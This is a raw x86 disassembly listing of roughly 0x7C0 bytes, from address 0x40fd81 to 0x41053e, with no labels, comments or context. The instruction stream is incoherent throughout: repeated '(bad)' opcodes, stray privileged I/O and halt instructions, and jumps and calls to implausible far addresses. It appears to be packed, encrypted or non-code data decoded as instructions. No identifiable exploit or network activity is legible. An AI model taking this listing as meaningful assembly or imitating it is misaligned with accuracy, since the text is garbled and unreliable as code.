  40fd81:	dec    ebp
  40fd83:	mov    ch,0xe6
  40fd85:	adc    DWORD PTR [edi-0x4c],edi
  40fd88:	std    
  40fd89:	(bad)  
  40fd8a:	mov    ebp,0x7f09e6e1
  40fd8f:	mov    ah,0xfd
  40fd91:	dec    DWORD PTR [ebp+0x3f01e6b5]
  40fd97:	fdivp  st(5),st
  40fd99:	inc    DWORD PTR [eax]
  40fd9b:	jge    0x40fd7e
  40fd9d:	out    0x25,al
  40fd9f:	sub    ecx,DWORD PTR ds:0x10dac900
  40fda5:	add    BYTE PTR [ebp-0x7d],dl
  40fda8:	mov    al,0x7f
  40fdaa:	(bad)  
  40fdab:	lock aad 0xfd
  40fdae:	call   DWORD PTR [ebp-0x79]
  40fdb1:	cli    
  40fdb2:	push   eax
  40fdb3:	xchg   edi,eax
  40fdb4:	push   edi
  40fdb5:	or     bh,bh
  40fdb7:	cmp    eax,0xeb0fe815
  40fdbc:	or     al,0x0
  40fdbe:	or     ecx,DWORD PTR [eax-0x275a7af3]
  40fdc4:	or     al,0x0
  40fdc6:	(bad)  
  40fdc7:	or     eax,0xc8fffee5
  40fdcc:	or     al,0xc7
  40fdce:	inc    ebp
  40fdcf:	cmp    al,0xdd
  40fdd1:	add    eax,0xfe329800
  40fdd6:	imul   ebx,DWORD PTR [eax+0x31ec838f],0x1fe53e7
  40fde0:	dec    esp
  40fde1:	add    cl,BYTE PTR [ebp-0x734cfa0c]
  40fde7:	lods   al,BYTE PTR ds:[esi]
  40fde8:	dec    BYTE PTR [ebx-0x2]
  40fdeb:	jle    0x40fd8f
  40fded:	push   ebx
  40fdee:	je     0x40fe69
  40fdf0:	test   ebp,0x20ec59fb
  40fdf6:	add    BYTE PTR [ecx],dh
  40fdf8:	cmp    eax,DWORD PTR [edx+0x73]
  40fdfb:	xor    ecx,DWORD PTR [ebx]
  40fdfd:	fld    QWORD PTR [edx+0x4a469400]
  40fe03:	dec    BYTE PTR [esi+0x31]
  40fe06:	into   
  40fe07:	add    al,0x46
  40fe09:	ins    DWORD PTR es:[edi],dx
  40fe0a:	pop    edx
  40fe0b:	jmp    0x373e:0xe77dad73
  40fe12:	push   edx
  40fe13:	dec    edi
  40fe14:	mov    esp,0x26f657b4
  40fe19:	addr16 mov bl,0xfe
  40fe1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1d:	cs push ecx
  40fe1f:	je     0x40fe4a
  40fe21:	dec    edx
  40fe22:	cmp    BYTE PTR [eax],0xe
  40fe25:	dec    edi
  40fe26:	(bad)  
  40fe27:	mov    edi,0x847b437d
  40fe2c:	add    DWORD PTR [edi+0x2489fe52],eax
  40fe32:	fild   WORD PTR [eax+0x31]
  40fe35:	outs   dx,DWORD PTR ds:[esi]
  40fe36:	cwde   
  40fe37:	out    dx,eax
  40fe38:	fisub  WORD PTR [esi+0x5400e752]
  40fe3e:	add    al,BYTE PTR [eax]
  40fe40:	sub    dh,BYTE PTR [edx-0x29]
  40fe43:	or     eax,0xf65404ce
  40fe48:	mov    dh,0x52
  40fe4b:	je     0x40fe6e
  40fe4d:	mov    dh,BYTE PTR [edi]
  40fe4f:	sti    
  40fe50:	mov    dh,0xb6
  40fe52:	push   edx
  40fe53:	mov    ah,0xa1
  40fe55:	or     BYTE PTR [esi+0x53],bl
  40fe58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe59:	xor    BYTE PTR [eax+0x55479e19],ch
  40fe5f:	leave  
  40fe60:	sahf   
  40fe61:	xor    edx,eax
  40fe63:	push   edx
  40fe64:	add    BYTE PTR [edi-0x7526bab9],cl
  40fe6a:	xor    BYTE PTR [ebp+eiz*1+0x46200931],bl
  40fe71:	sub    cl,BYTE PTR [ecx]
  40fe73:	xchg   esp,eax
  40fe74:	jle    0x40fed0
  40fe76:	mov    ebp,DWORD PTR [eax+edx*2]
  40fe79:	fmul   DWORD PTR [eax]
  40fe7b:	xchg   ebx,eax
  40fe7c:	mov    dh,0x5f
  40fe7e:	mov    ebp,0xfc005be0
  40fe83:	or     eax,0x4cdb953
  40fe88:	push   ebx
  40fe89:	mov    ebp,0xc8639110
  40fe8e:	leave  
  40fe8f:	call   0xa09bfbe6
  40fe94:	les    ebp,FWORD PTR [esi]
  40fe96:	das    
  40fe97:	scas   al,BYTE PTR es:[edi]
  40fe98:	push   eax
  40fe99:	daa    
  40fe9a:	inc    edi
  40fe9b:	fstp   st(0)
  40fe9d:	ss mov cl,0xc8
  40fea0:	fnsave [ecx+0x9]
  40fea3:	inc    ecx
  40fea4:	push   es
  40fea5:	xor    DWORD PTR [ecx],ecx
  40fea7:	imul   ebx,DWORD PTR [ebx-0x3e],0xff52bd44
  40feae:	mov    esp,0xb22fdbe0
  40feb3:	daa    
  40feb4:	add    al,0xee
  40feb6:	cld    
  40feb7:	mov    edx,0x910971bb
  40febc:	pop    ebp
  40febd:	fadd   QWORD PTR [esi-0x6b]
  40fec0:	push   edx
  40fec1:	pop    ebp
  40fec2:	adc    DWORD PTR [ecx],eax
  40fec4:	or     ebx,DWORD PTR [edx-0x38]
  40fec7:	call   0x970ffa7
  40fecc:	jmp    0xffa2d554
  40fed1:	jbe    0x40ff36
  40fed3:	inc    edi
  40fed4:	(bad)  
  40fed5:	hlt    
  40fed6:	inc    BYTE PTR [esi+0x74]
  40fed9:	icebp  
  40feda:	or     al,BYTE PTR [esi]
  40fedc:	xor    ebx,DWORD PTR [esi+0x3]
  40fedf:	push   ecx
  40fee0:	shr    ebp,0x32
  40fee3:	fmul   QWORD PTR [edx-0x4b548c3]
  40fee9:	shl    DWORD PTR [edx],cl
  40feeb:	mov    bl,0x53
  40feed:	ds pop ecx
  40feef:	push   cs
  40fef0:	call   0xfe871b42
  40fef5:	pusha  
  40fef6:	jns    0x40ff3a
  40fef8:	mov    al,BYTE PTR [bx-0x37]
  40fefd:	sbb    eax,0x8de80e79
  40ff02:	push   es
  40ff03:	inc    edi
  40ff04:	dec    BYTE PTR [esi]
  40ff06:	imul   eax,DWORD PTR [edx-0x2],0xe2e4a7c
  40ff0d:	mov    edx,0x2bc846e3
  40ff12:	or     DWORD PTR cs:[ebp+0x62],edx
  40ff16:	mov    cs,WORD PTR [ebx-0x21141a3d]
  40ff1c:	imul   ebp,ecx,0x5cfedcfc
  40ff22:	adc    eax,0x601bb02e
  40ff27:	inc    edi
  40ff28:	mov    BYTE PTR [ecx+eiz*2],ch
  40ff2b:	xchg   ebx,eax
  40ff2c:	xor    al,0x17
  40ff2e:	add    BYTE PTR [ebp+0x2661ffc8],bh
  40ff34:	jecxz  0x40ff7d
  40ff36:	sub    BYTE PTR ds:0xfee93e89,dh
  40ff3c:	int3   
  40ff3d:	addr16 adc bh,ah
  40ff40:	enter  0x3dff,0x75
  40ff44:	push   esp
  40ff45:	and    cl,ch
  40ff47:	xor    dl,BYTE PTR [edx]
  40ff49:	rol    BYTE PTR [eax],0xc4
  40ff4c:	cmp    BYTE PTR [eax+ebp*8-0x16],dl
  40ff50:	sbb    bh,bh
  40ff52:	call   FWORD PTR [eax]
  40ff54:	gs (bad) 
  40ff56:	jmp    FWORD PTR [edi]
  40ff58:	fwait
  40ff59:	data16 jb 0x40fedf
  40ff5c:	dec    edx
  40ff5d:	dec    BYTE PTR [edi-0x1]
  40ff60:	pop    ebp
  40ff61:	push   es
  40ff62:	call   0x3e7a95
  40ff67:	lock pop ds
  40ff69:	xor    eax,0xffe3efff
  40ff6e:	inc    ebp
  40ff6f:	or     BYTE PTR [ebx],bl
  40ff71:	add    BYTE PTR [ebp+0x42],dh
  40ff74:	push   ebx
  40ff75:	cli    
  40ff76:	xor    ebx,DWORD PTR [eax]
  40ff78:	xchg   edx,eax
  40ff79:	std    
  40ff7a:	dec    DWORD PTR [edi]
  40ff7c:	fdiv   st,st(0)
  40ff7e:	scas   al,BYTE PTR es:[edi]
  40ff7f:	push   eax
  40ff80:	adc    BYTE PTR [ebp-0x45],dh
  40ff83:	aas    
  40ff84:	pop    esi
  40ff85:	cli    
  40ff86:	jmp    DWORD PTR [ebp-0x756c19bf]
  40ff8c:	fdivr  st,st(5)
  40ff8e:	pop    edi
  40ff8f:	sahf   
  40ff90:	add    al,cl
  40ff92:	add    al,0x0
  40ff94:	dec    eax
  40ff95:	jle    0x40ff20
  40ff97:	in     al,dx
  40ff98:	fwait
  40ff99:	shl    esi,1
  40ff9b:	or     DWORD PTR [ebp-0x33],0x49
  40ff9f:	inc    ecx
  40ffa0:	or     BYTE PTR [ecx],cl
  40ffa2:	jne    0x40ffa8
  40ffa4:	ror    esi,1
  40ffa6:	push   es
  40ffa7:	add    BYTE PTR [eax+0xc],dh
  40ffaa:	add    DWORD PTR [eax],eax
  40ffac:	sbb    cl,ah
  40ffae:	pop    es
  40ffaf:	xor    eax,0x4587d9bf
  40ffb4:	mov    esp,0xd4f843d1
  40ffb9:	pop    es
  40ffba:	add    BYTE PTR [eax],al
  40ffbc:	pop    ebp
  40ffbd:	dec    ebx
  40ffbe:	not    BYTE PTR [eax-0x41]
  40ffc1:	pop    ebx
  40ffc2:	cli    
  40ffc3:	push   DWORD PTR [ecx]
  40ffc5:	and    eax,0x6644ff00
  40ffca:	dec    edi
  40ffcb:	adc    al,0xf1
  40ffcd:	test   edx,0x4e3dbfff
  40ffd3:	out    0x92,eax
  40ffd5:	pop    ebx
  40ffd6:	add    al,BYTE PTR [eax]
  40ffd8:	mov    dl,0xba
  40ffda:	add    esi,DWORD PTR [esi+0x3c]
  40ffdd:	pop    edx
  40ffde:	add    al,BYTE PTR [eax]
  40ffe0:	mov    fs,WORD PTR [edx+ebx*8+0x2710a7d]
  40ffe7:	inc    DWORD PTR [esi+edx*8]
  40ffea:	dec    edi
  40ffeb:	je     0x410026
  40ffed:	fisub  DWORD PTR [ebp+0x50037e5c]
  40fff3:	je     0x41006a
  40fff5:	retf   0x339b
  40fff8:	add    BYTE PTR [esi-0xd],ch
  40fffb:	cmp    ecx,eax
  40fffd:	cmp    DWORD PTR [edx],esi
  40ffff:	mov    ch,0x8a
  410001:	dec    ebp
  410002:	scas   eax,DWORD PTR es:[edi]
  410003:	inc    esi
  410004:	sti    
  410005:	retf   
  410006:	xor    esp,ebx
  410008:	push   ebp
  410009:	dec    esi
  41000a:	popf   
  41000b:	cli    
  41000c:	out    0x74,eax
  41000e:	or     DWORD PTR [edi-0x2],0x674e6da8
  410015:	mov    dl,0x87
  410017:	sar    edi,0x2f
  41001a:	mov    ebp,0x2b9fe7fa
  41001f:	dec    esi
  410020:	(bad)  
  410021:	push   ds
  410022:	fisttp QWORD PTR [edi-0x2]
  410025:	pushf  
  410026:	sub    bl,BYTE PTR [edx-0x9]
  410029:	inc    eax
  41002a:	push   ebx
  41002b:	dec    esi
  41002c:	enter  0x35f3,0x2
  410030:	push   ebp
  410031:	stos   BYTE PTR es:[edi],al
  410032:	push   ebp
  410033:	add    bl,0xf5
  410036:	mov    DWORD PTR [ebx],0xd873866a
  41003c:	pop    es
  41003d:	(bad)  [eax]
  41003f:	test   DWORD PTR ds:0xc96f43de,edx
  410045:	fidiv  DWORD PTR [eax-0x7d21fc18]
  41004b:	add    BYTE PTR [edx-0x241735a5],bl
  410051:	test   DWORD PTR [edi-0x4249fbd9],ebp
  410057:	loopne 0x4100b4
  410059:	mov    bh,0xe5
  41005b:	ins    DWORD PTR es:[edi],dx
  41005c:	dec    edi
  41005d:	add    BYTE PTR [edi+0x254f64bd],ah
  410063:	adc    DWORD PTR [ecx-0x6f],edx
  410066:	popa   
  410067:	inc    esp
  410068:	push   ebp
  410069:	cmp    eax,0xb8e90c70
  41006e:	mov    ebx,0x62486934
  410073:	ficom  DWORD PTR [ebp+0x4114fd4e]
  410079:	cld    
  41007a:	sub    DWORD PTR [ebp+ebp*1-0x5],eax
  41007e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007f:	mov    ebp,0x51fcaeee
  410084:	sub    bh,ah
  410086:	push   esi
  410087:	xchg   esp,eax
  410088:	stos   DWORD PTR es:[edi],eax
  410089:	push   ebx
  41008a:	inc    BYTE PTR [ebx-0x6d]
  41008d:	dec    DWORD PTR [esi-0x7f]
  410090:	mov    edi,0x290f3f4e
  410095:	push   DWORD PTR [edx+0x3103e7df]
  41009b:	inc    edx
  41009c:	jae    0x4100ed
  41009e:	mov    bh,0xcc
  4100a0:	les    esi,FWORD PTR [ecx*4-0x527229b]
  4100a7:	inc    edx
  4100a8:	pop    ebx
  4100a9:	dec    esp
  4100aa:	push   ss
  4100ab:	sub    DWORD PTR fs:[edi+0x7],ecx
  4100af:	pop    gs
  4100b1:	xlat   BYTE PTR ds:[ebx]
  4100b2:	aaa    
  4100b3:	nop
  4100b4:	and    esp,DWORD PTR [eax-0x55]
  4100b7:	cmp    edi,edi
  4100b9:	rcr    esi,0x43
  4100bc:	je     0x41006b
  4100be:	mov    al,BYTE PTR [ebp+0x32]
  4100c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100c2:	add    BYTE PTR [edi-0x6f],ch
  4100c5:	inc    esp
  4100c6:	lea    esp,[edi-0x43]
  4100c9:	sti    
  4100ca:	xchg   esi,eax
  4100cb:	jmp    0x7555fefe
  4100d0:	sub    ah,BYTE PTR [edx]
  4100d2:	mov    ebp,0xf48a436f
  4100d7:	push   esi
  4100d8:	xor    edi,ebx
  4100da:	jmp    0x88000a11
  4100df:	mov    ecx,ecx
  4100e1:	(bad)  
  4100e2:	mov    ebp,0x9462ae4
  4100e7:	sub    eax,0x66290b09
  4100ec:	or     bl,ch
  4100ee:	cli    
  4100ef:	div    dh
  4100f1:	mov    edi,0xfe42ef80
  4100f6:	ds loopne 0x41016c
  4100f9:	aaa    
  4100fa:	out    dx,al
  4100fb:	mov    DWORD PTR ds:0x93221e8,ebp
  410101:	add    BYTE PTR [edx+0x2],dh
  410104:	stos   BYTE PTR es:[edi],al
  410105:	loopne 0x410099
  410107:	ins    DWORD PTR es:[edi],dx
  410108:	inc    edx
  410109:	push   esp
  41010a:	add    DWORD PTR [edi+0x22],ecx
  41010d:	add    cl,ch
  41010f:	dec    ebx
  410110:	xor    BYTE PTR [esp+ebp*8-0x23],0x77
  410115:	(bad)  
  410116:	call   0xf9cbca4d
  41011b:	stos   BYTE PTR es:[edi],al
  41011c:	mov    ebp,0xaf9381e7
  410121:	inc    eax
  410122:	jmp    0x9472b0b
  410127:	add    BYTE PTR ds:0xe6a90b09,ch
  41012d:	or     al,0xe9
  41012f:	jno    0x41015e
  410131:	or     DWORD PTR [eax],eax
  410133:	add    BYTE PTR [edx+0x800c43d],al
  410139:	jbe    0x41018b
  41013b:	jmp    FWORD PTR ds:0xf63fe6e5
  410141:	add    eax,0x60880b00
  410146:	jb     0x4100d1
  410148:	or     eax,0xb075fdb1
  41014d:	in     al,0x1c
  41014f:	inc    ebx
  410150:	mov    bh,0xd3
  410152:	xchg   DWORD PTR [ebp-0x58],eax
  410155:	shl    DWORD PTR [ebx-0x1c],cl
  410158:	aaa    
  410159:	pop    edx
  41015a:	fsubp  st(0),st
  41015c:	cwde   
  41015d:	dec    ecx
  41015e:	std    
  41015f:	call   DWORD PTR [ebx+0x594f72c5]
  410165:	(bad)  {k5}
  41016a:	imul   eax,DWORD PTR [ecx-0x68],0xf7d843c4
  410171:	sbb    ebp,ebx
  410173:	imul   ecx,ecx,0x5
  410176:	pop    DWORD PTR [ebp+0x1c]
  410179:	ret    0xd443
  41017c:	enter  0x43c2,0xe4
  410180:	enter  0x73d4,0xe0
  410184:	inc    eax
  410185:	ins    DWORD PTR es:[edi],dx
  410186:	pop    edx
  410187:	push   DWORD PTR [edi]
  410189:	inc    eax
  41018a:	mov    esi,0x5d7e0074
  41018f:	(bad)  
  410190:	inc    DWORD PTR [edi-0x6d]
  410193:	std    
  410194:	jne    0x4101d6
  410196:	ffree  st(1)
  410198:	das    
  410199:	aaa    
  41019a:	aam    0xfd
  41019c:	jne    0x4101ce
  41019e:	into   
  41019f:	jae    0x4101a9
  4101a1:	xor    BYTE PTR [ebx],dh
  4101a3:	call   DWORD PTR cs:[edi]
  4101a6:	into   
  4101a7:	jae    0x41018d
  4101a9:	not    DWORD PTR [edi-0x22]
  4101ac:	push   DWORD PTR [ecx]
  4101ae:	(bad)  
  4101b0:	out    0x11,eax
  4101b2:	inc    eax
  4101b3:	dec    ebx
  4101b4:	(bad)  
  4101b5:	(bad)  
  4101b6:	std    
  4101b7:	arpl   di,sp
  4101b9:	add    BYTE PTR [ebp+0x4b],al
  4101bc:	dec    BYTE PTR [ebx+0x3a0f7c1a]
  4101c2:	js     0x41019a
  4101c4:	or     BYTE PTR [ecx-0x53f0fdd8],dh
  4101ca:	inc    ebx
  4101cb:	dec    ebx
  4101cc:	dec    dh
  4101ce:	or     al,BYTE PTR [edx]
  4101d0:	add    dh,dl
  4101d2:	ror    BYTE PTR [ebx+0x74],1
  4101d5:	sub    DWORD PTR [edx-0x4049d17a],ebx
  4101db:	dec    ebx
  4101dc:	je     0x41018b
  4101de:	mov    bh,0xd5
  4101e0:	mul    DWORD PTR [esi-0x321805cb]
  4101e6:	pop    ss
  4101e7:	dec    ebp
  4101e8:	(bad)  
  4101e9:	xchg   esi,eax
  4101ea:	push   ebp
  4101eb:	pop    esi
  4101ec:	out    0xcc,eax
  4101ee:	and    al,0x4d
  4101f0:	inc    BYTE PTR [eax]
  4101f2:	mov    ah,0x65
  4101f4:	push   edx
  4101f5:	dec    edi
  4101f6:	mov    esi,edx
  4101f8:	or     bh,bh
  4101fa:	jbe    0x4101d7
  4101fc:	add    bl,BYTE PTR [edi+0xf]
  4101ff:	jmp    0x95720944
  410204:	ja     0x4101f1
  410206:	pop    esi
  410207:	popf   
  410208:	(bad)  
  410209:	(bad)  
  41020a:	fdivr  QWORD PTR [ecx]
  41020c:	pop    edx
  41020d:	bound  ecx,QWORD PTR [edi+0x17]
  410210:	dec    esp
  410211:	enter  0x5e73,0x2
  410215:	push   ebp
  410216:	stos   BYTE PTR es:[edi],al
  410217:	push   ss
  410218:	dec    esp
  410219:	je     0x410240
  41021b:	sbb    ah,BYTE PTR [ebp+esi*1+0x2e]
  41021f:	aaa    
  410220:	idiv   BYTE PTR [edi+0x744b539d]
  410226:	inc    ecx
  410227:	or     DWORD PTR [ecx],edi
  410229:	pop    esp
  41022a:	popf   
  41022b:	neg    ebp
  41022d:	dec    ebx
  41022e:	jle    0x4101e1
  410230:	fsub   QWORD PTR [ecx+0x46]
  410233:	or     esi,ecx
  410235:	shl    DWORD PTR [esi],1
  410237:	inc    eax
  410238:	cmp    esi,eax
  41023a:	inc    ax
  41023c:	xor    edi,esp
  41023e:	(bad)  
  41023f:	je     0x410250
  410241:	dec    ebx
  410242:	out    0x30,eax
  410244:	inc    eax
  410245:	push   ss
  410246:	fidivr WORD PTR [edi]
  410248:	scas   eax,DWORD PTR es:[edi]
  410249:	inc    esi
  41024a:	inc    edx
  41024b:	or     DWORD PTR [edi+edi*2],esi
  41024e:	fidiv  DWORD PTR [eax+0x7ed603e8]
  410254:	add    BYTE PTR ds:0xe8ca4b00,bh
  41025a:	dec    edx
  41025b:	cmp    eax,0xafee130d
  410260:	mov    ch,0xe0
  410262:	pop    ebx
  410263:	(bad)  
  410264:	aas    
  410265:	ins    DWORD PTR es:[edi],dx
  410266:	dec    ebx
  410267:	push   ss
  410268:	or     ecx,ebp
  41026a:	pop    edx
  41026b:	aam    0xb0
  41026d:	das    
  41026e:	fcomip st,st(1)
  410270:	or     BYTE PTR [esi-0x2f],dl
  410273:	cmp    dh,BYTE PTR [ebx+0x11054aec]
  410279:	push   ecx
  41027a:	ins    DWORD PTR es:[edi],dx
  41027b:	ja     0x4102bc
  41027d:	cmp    eax,0x453f6edc
  410282:	mov    cl,dh
  410284:	push   ecx
  410285:	rol    esp,0x5e
  410288:	ds fwait
  41028a:	test   eax,0x36d11deb
  410290:	xor    DWORD PTR [edx+0x4b],ebp
  410293:	inc    edi
  410294:	aas    
  410295:	pop    ds
  410296:	inc    esi
  410297:	or     DWORD PTR ss:[esi+edi*2-0x20e44fb6],ebx
  41029f:	jno    0x4102aa
  4102a1:	add    BYTE PTR [ecx-0x16bf4caa],al
  4102a7:	imul   esi,DWORD PTR [ebp+0x5b41e60f],0x47
  4102ae:	sub    BYTE PTR ds:0x7a1c1431,dh
  4102b4:	aas    
  4102b5:	or     ch,BYTE PTR [ecx-0x5f5cdc12]
  4102bb:	add    bh,dl
  4102bd:	leave  
  4102be:	(bad)  
  4102bf:	mov    ebp,0x3cff1301
  4102c4:	in     eax,0x26
  4102c6:	test   BYTE PTR [esi-0x2301c095],ch
  4102cc:	add    eax,0x6ae940b3
  4102d1:	pop    esp
  4102d2:	xor    BYTE PTR [esi-0x223eae85],dl
  4102d8:	xor    dl,ah
  4102da:	mov    dl,BYTE PTR [ebp+0x13fb4aaf]
  4102e0:	xor    eax,0x817658b3
  4102e5:	push   es
  4102e6:	call   0xfe7f3ed4
  4102eb:	jo     0x41035e
  4102ed:	inc    edx
  4102ee:	addr16 mov cl,0x66
  4102f1:	leave  
  4102f2:	inc    eax
  4102f4:	daa    
  4102f5:	lods   eax,DWORD PTR ds:[esi]
  4102f6:	inc    eax
  4102f7:	jmp    0x5148b7e7
  4102fc:	pop    es
  4102fd:	aas    
  4102fe:	(bad)  
  4102ff:	ds sti 
  410301:	mov    ah,0xfb
  410303:	add    DWORD PTR ss:[esi],0x3e3a07e8
  41030a:	(bad)  
  41030b:	xor    ah,ch
  41030d:	or     DWORD PTR [eax],eax
  41030f:	mov    ah,0xcf
  410311:	xor    DWORD PTR [edx-0x5011d3],eax
  410317:	or     BYTE PTR [edx+0x4000743f],0xe2
  41031e:	enter  0x2e,0x2f
  410322:	rol    BYTE PTR [edi-0x7c9ce3bb],1
  410328:	ins    BYTE PTR es:[edi],dx
  410329:	leave  
  41032a:	or     DWORD PTR [eax+0x6d],ebp
  41032d:	jl     0x410379
  41032f:	(bad)  
  410330:	(bad)  
  410331:	gs cmp eax,0xcfdf65e6
  410337:	std    
  410338:	jmp    DWORD PTR [ebp-0x2f]
  41033b:	std    
  41033c:	jne    0x41033e
  41033e:	loop   0x41032e
  410340:	cs scas eax,DWORD PTR es:[edi]
  410342:	iret   
  410343:	mov    edx,0x8b5509d4
  410349:	pushf  
  41034a:	add    edx,0xfffffffc
  41034d:	inc    edx
  41034e:	add    eax,0x4daf5a6a
  410353:	push   es
  410354:	call   0x40269d
  410359:	push   ecx
  41035a:	jle    0x410356
  41035c:	push   0xffffffc8
  41035e:	popa   
  41035f:	shr    BYTE PTR [ecx+ebx*2+0x5],0x68
  410364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410365:	sub    al,0x4a
  410367:	(bad)  
  410368:	(bad)  
  410369:	in     eax,0xf3
  41036b:	inc    esi
  41036c:	inc    ecx
  41036d:	mov    cl,ah
  41036f:	pop    eax
  410370:	xor    al,0xef
  410372:	iret   
  410373:	or     eax,eax
  410375:	xor    cl,BYTE PTR fs:[esi+0x68]
  410379:	mov    BYTE PTR [ecx],cl
  41037b:	out    dx,eax
  41037c:	mov    esi,0x416aee60
  410381:	pop    eax
  410382:	jns    0x410381
  410384:	jne    0x410386
  410386:	push   eax
  410387:	loope  0x4103a3
  410389:	pop    edx
  41038a:	(bad)  
  41038c:	out    0x25,al
  41038e:	jns    0x410360
  410390:	std    
  410391:	push   0x58
  410393:	popa   
  410394:	shr    BYTE PTR [ecx+esi*1+0x71],0x2
  410399:	push   0xffc1bb94
  41039e:	into   
  41039f:	xor    DWORD PTR [edx],eax
  4103a1:	add    BYTE PTR [ecx+0x2634211a],dh
  4103a7:	xor    al,0xfb
  4103a9:	mov    edi,0x67b259a5
  4103ae:	xor    DWORD PTR [edx],esi
  4103b0:	push   edi
  4103b1:	mov    ebp,0x40d67599
  4103b6:	xor    DWORD PTR [edx],eax
  4103b8:	dec    ecx
  4103b9:	je     0x4103e4
  4103bb:	dec    edx
  4103bc:	pop    ecx
  4103bd:	pop    eax
  4103be:	test   BYTE PTR [ebx+0x5a],0xf1
  4103c2:	and    DWORD PTR [ebx+0x47],edi
  4103c5:	imul   esi,DWORD PTR [ecx],0x706b3dca
  4103cb:	xor    bl,dl
  4103cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103ce:	inc    ebp
  4103cf:	icebp  
  4103d0:	add    edi,edi
  4103d2:	add    al,0x80
  4103d4:	mov    edx,0x538a3140
  4103d9:	xor    bh,BYTE PTR [esi+0x3dbffb8b]
  4103df:	sub    DWORD PTR [edx+0x57323167],esi
  4103e5:	mov    ebp,0x40d69d19
  4103ea:	add    BYTE PTR [ecx],dh
  4103ec:	and    cl,BYTE PTR [ecx+0x74]
  4103ef:	sub    edx,ebx
  4103f1:	lea    ebx,[eax-0x72]
  4103f4:	fistp  DWORD PTR [edx-0x43]
  4103f7:	inc    ecx
  4103f8:	rol    DWORD PTR [edi+0x69],cl
  4103fb:	xor    DWORD PTR [edx+0x3c],ecx
  4103fe:	imul   esi,eax,0x31
  410401:	fisub  DWORD PTR [ebp+ebx*8+0x33680270]
  410408:	xor    al,BYTE PTR [edx]
  41040a:	or     BYTE PTR [ecx-0xe],0x13
  41040e:	call   DWORD PTR [esi+0x9]
  410411:	repnz inc ebx
  410413:	ret    0xb921
  410416:	fild   DWORD PTR [esi+0x3c]
  410419:	add    eax,0x7c55d689
  41041e:	ret    0xcc36
  410421:	add    eax,0x6a3136ce
  410426:	stos   BYTE PTR es:[edi],al
  410427:	daa    
  410428:	cmp    al,0x0
  41042a:	jl     0x41047a
  41042c:	cmp    al,0xed
  41042e:	inc    edi
  41042f:	popf   
  410430:	cmp    eax,0x3136d1e5
  410435:	ficomp WORD PTR [ecx]
  410437:	push   es
  410438:	cmp    al,0x9f
  41043a:	inc    edx
  41043b:	xor    cl,BYTE PTR [ecx]
  41043d:	xor    al,0x7b
  41043f:	or     cl,BYTE PTR [edx+0x3be75cac]
  410445:	mov    ebp,0xe90a2ddc
  41044a:	add    ecx,ecx
  41044c:	mov    al,bh
  41044e:	inc    esi
  41044f:	add    bh,dl
  410451:	xchg   ecx,eax
  410452:	imul   ebx,DWORD PTR [edi+eax*8+0x3b],0xffffff9d
  410457:	jns    0x4104c6
  410459:	cmp    eax,0xd454738
  41045e:	mov    ss,ecx
  410460:	xor    DWORD PTR cs:[esi-0x18],ebp
  410464:	scas   al,BYTE PTR es:[edi]
  410465:	cmp    esi,ecx
  410467:	inc    ebx
  410468:	aaa    
  410469:	xchg   cl,ah
  41046b:	add    al,0x31
  41046d:	or     DWORD PTR [esi-0x16f7613f],esp
  410473:	add    esi,DWORD PTR [ecx]
  410475:	inc    esp
  410476:	mov    ds:0xe903874f,eax
  41047b:	add    ecx,DWORD PTR [ebx]
  41047d:	or     ebx,eax
  41047f:	add    ecx,DWORD PTR [ebx]
  410481:	or     ebx,edx
  410483:	add    edi,DWORD PTR [ebp+eax*8-0x7a4a4bcc]
  41048a:	(bad)  
  41048b:	cmp    al,0xee
  41048d:	cmp    bh,dh
  41048f:	cdq    
  410490:	out    dx,eax
  410491:	mov    ah,0xf7
  410493:	es pusha 
  410495:	aas    
  410496:	out    0xc1,eax
  410498:	dec    esi
  410499:	cmp    edi,esi
  41049b:	loop   0x41048f
  41049d:	mov    bh,0x4
  41049f:	add    bh,bh
  4104a1:	cmp    edi,esi
  4104a3:	jmp    0xa88871b2
  4104a8:	xor    bh,BYTE PTR [edx]
  4104aa:	je     0x410491
  4104ac:	jp     0x41051f
  4104ae:	xor    ch,dh
  4104b0:	outs   dx,DWORD PTR ds:[esi]
  4104b1:	retf   0xb98a
  4104b4:	add    BYTE PTR [ecx+0x6fd6f385],cl
  4104ba:	cmp    ecx,DWORD PTR [edi+0x3b]
  4104bd:	pop    ebp
  4104be:	mov    eax,ds:0x916fce32
  4104c3:	test   BYTE PTR [ecx-0x2e01c481],bh
  4104c9:	jg     0x4104b6
  4104cb:	(bad)  
  4104cc:	mov    dh,0xf8
  4104ce:	cmp    ah,BYTE PTR [esi-0x4e]
  4104d1:	dec    cl
  4104d3:	jmp    DWORD PTR [ebp-0x6109d55f]
  4104d9:	outs   dx,DWORD PTR ds:[esi]
  4104da:	cmp    esi,DWORD PTR [ecx+eiz*8+0x5a]
  4104de:	cmp    BYTE PTR [ecx],dh
  4104e0:	mov    gs,WORD PTR [edi-0x6f]
  4104e3:	test   BYTE PTR [ebp+0x6afe3aff],dl
  4104e9:	mov    ecx,0xf776f62e
  4104ee:	cmp    DWORD PTR [edx+0x1a],esi
  4104f1:	jne    0x41052d
  4104f3:	imul   ebp,DWORD PTR [eax+0x4db43a32],0xfffffff7
  4104fa:	cmp    bh,dh
  4104fc:	inc    ecx
  4104fd:	enter  0xfef7,0x4e
  410501:	ret    0x67ca
  410504:	add    BYTE PTR [ebp+eax*1+0x0],bl
  410508:	add    BYTE PTR [edi],ah
  41050a:	cdq    
  41050b:	out    0xf7,al
  41050d:	daa    
  41050e:	ret    
  41050f:	data16 mov al,0x90
  410512:	inc    ebp
  410513:	(bad)  
  410514:	xor    BYTE PTR [bx+si+0x3f],ah
  410518:	add    BYTE PTR [eax],al
  41051a:	mov    al,ds:0x48416b36
  41051f:	fiadd  WORD PTR [eax+0x1b]
  410522:	dec    eax
  410523:	push   es
  410524:	cmp    eax,0x1b
  410527:	dec    esp
  410528:	push   ss
  410529:	push   0xbeef0618
  41052e:	mov    al,0xe4
  410530:	ins    BYTE PTR es:[edi],dx
  410531:	inc    ecx
  410532:	or     bl,al
  410534:	mov    bl,0xe8
  410536:	out    dx,eax
  410537:	ret    
  410538:	std    
  410539:	call   FWORD PTR [ebp+0x35]
  41053c:	out    0x6f,al
  41053e:	inc    eax
